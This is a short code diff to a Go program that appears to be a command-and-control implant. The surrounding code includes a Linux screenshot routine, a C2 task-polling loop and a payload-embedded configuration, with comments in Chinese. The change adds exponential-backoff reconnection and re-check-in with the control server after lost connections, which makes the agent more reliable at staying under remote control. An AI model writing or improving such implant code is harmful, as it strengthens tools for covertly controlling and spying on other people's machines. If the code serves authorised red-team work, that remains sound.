@@ -3146,6 +3146,14 @@ func linuxScreenshot() (string, string) {
 	return "", "screenshot failed: " + lastErr
 }
 
+// minInt 返回较小值（Go 1.20 之前没有内建 min 时可用的简单实现）。
+func minInt(a, b int) int {
+	if a < b {
+		return a
+	}
+	return b
+}
+
 func main() {
 	// 命令行覆盖：方便本地/交付时直接跑，不必每次用 ldflags 重新编译。
 	// 优先级：命令行 > 载荷内嵌配置（文件尾部 trailer）> ldflags 注入值。
@@ -3253,6 +3261,7 @@ func main() {
 	}
 
 	// Main C2 polling loop
+	pollFailures := 0
 	for {
 		jitter := time.Duration(0)
 		if jitterTime > 0 {
@@ -3264,8 +3273,24 @@ func main() {
 
 		tasks, err := transport.GetTasks()
 		if err != nil {
+			// 断链（最常见：服务端重启）：丢弃旧连接并重新握手，
+			// 否则 agent 会一直往死 socket 上写，看起来"进程还在但永远离线"。
+			pollFailures++
+			if r, ok := transport.(interface{ Reset() }); ok {
+				r.Reset()
+			}
+			wait := time.Duration(1<<minInt(pollFailures, 6)) * time.Second
+			log.Printf("poll failed: %v (reconnect in %v)", err, wait)
+			time.Sleep(wait)
+			if _, cerr := transport.Checkin(); cerr != nil {
+				log.Printf("re-checkin failed: %v", cerr)
+			} else {
+				log.Printf("re-checkin ok (client=%d)", clientID)
+				pollFailures = 0
+			}
 			continue
 		}
+		pollFailures = 0
 		if len(tasks) == 0 {
 			continue
 		}
